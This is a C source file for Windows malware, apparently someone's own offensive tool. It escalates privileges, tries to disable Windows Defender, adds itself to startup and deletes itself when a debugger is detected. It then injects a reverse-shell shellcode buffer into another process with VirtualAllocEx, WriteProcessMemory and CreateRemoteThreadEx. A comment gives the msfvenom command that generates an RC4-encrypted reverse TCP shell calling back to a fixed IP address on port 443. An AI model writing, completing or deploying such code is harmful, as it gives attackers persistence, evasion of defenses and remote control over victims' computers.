#include <stdio.h>
#include <windows.h>
#include "add_to_startup.h"
#include "priv_esc.h"
#include "disable_windef.h"
#include "find_pid.h"
#include "shellcode.h"
#include <stdbool.h>
#include "DebugProtection.h"
//#include "dll_inj.h"

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

//msfvenom --platform windows --arch x64 EXITFUNC=thread -p windows/x64/shell/reverse_tcp_rc4 LHOST=172.19.59.54 LPORT=443 RC4PASSWORD=PASS EXITFUNC=thread -f c --var-name=ucReverseShell
// and put it in the shell code program


DWORD PID,TID= NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;


int main(int arcg,char* argv[]) {

	if (oDebug)
	{

		if (IsDebuggerPresent()){
			
			SelfDelete();
			
		
		}


		LARGE_INTEGER StartingTime, EndingTime, ElapsedMicroseconds;
		LARGE_INTEGER Frequency;

		QueryPerformanceFrequency(&Frequency);
		QueryPerformanceCounter(&StartingTime);

		/*
		AddToStartup();

		if (arcg < 2) { printf("%s usage : rogram.exe <PID>", e);
		return EXIT_FAILURE;
		}

		PID = atoi(argv[1]);
		*/
		PID = get_pid();

		priv_esc();
		printf("%s trying to disable windows defender...\n", k);

		if (!dis_windef()) {

			printf("%s faild disable windows defender :(\n", e);
		}

		printf("%s starting main meoware.exe...\n", i);




		AddToStartup();
		printf("%s add to startup \n",k);

		printf("%s trying to open handle to process (%ld)\n", i, PID);

		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
		printf("%s got a handle to the process\n\\---0x%p\n", k, hProcess);

		if (hProcess == NULL) {

			printf("%s couldnt get a handle to process (%ld), error : %ld", e, PID, GetLastError());
			return EXIT_FAILURE;
		}

		rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(ucReverseShell), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
		printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(ucReverseShell));

		WriteProcessMemory(hProcess, rBuffer, ucReverseShell, sizeof(ucReverseShell), NULL);
		printf("%s wrote %zu-bytes to process memory\n", k, sizeof(ucReverseShell));

		hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

		if (hThread == NULL) {

			printf("%s faild to get a handle to the thread , error: %ld ", e, GetLastError());
			CloseHandle(hProcess);
			return EXIT_FAILURE;
		}

		QueryPerformanceCounter(&EndingTime);
		ElapsedMicroseconds.QuadPart = EndingTime.QuadPart - StartingTime.QuadPart;
		ElapsedMicroseconds.QuadPart *= 1000000;
		ElapsedMicroseconds.QuadPart /= Frequency.QuadPart;
		printf("%s got a handle to the thread (%ld),\n[*]to here in %lu micro Sec\n\\ ---0x%p\n ", k, TID, hThread, ElapsedMicroseconds);

		WaitForSingleObject(hThread, INFINITE);
		printf("%s thread finished execution\n", k);

		printf("%s cleaning up\n", i);
		CloseHandle(hThread);
		CloseHandle(hProcess);
		free(&k);
		free(&i);
		free(&e);
		printf("%s finishd!\n", k);

		return EXIT_SUCCESS;
	}
	else if (!oDebug)
	{

		if (IsDebuggerPresent()) {

			SelfDelete();

		}


		/*
		AddToStartup();

		if (arcg < 2) { printf("%s usage : rogram.exe <PID>", e);
		return EXIT_FAILURE;
		}

		PID = atoi(argv[1]);
		*/
		PID = get_pid();

		priv_esc();


		dis_windef();


		AddToStartup();



		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);


		if (hProcess == NULL) {

			return EXIT_FAILURE;
		}

		rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(ucReverseShell), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);


		WriteProcessMemory(hProcess, rBuffer, ucReverseShell, sizeof(ucReverseShell), NULL);
		

		hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

		if (hThread == NULL) {

			
			CloseHandle(hProcess);
			return EXIT_FAILURE;
		}


		WaitForSingleObject(hThread, INFINITE);


		CloseHandle(hThread);
		CloseHandle(hProcess);
		free(&k);
		free(&i);
		free(&e);

		return EXIT_SUCCESS;
	}
}
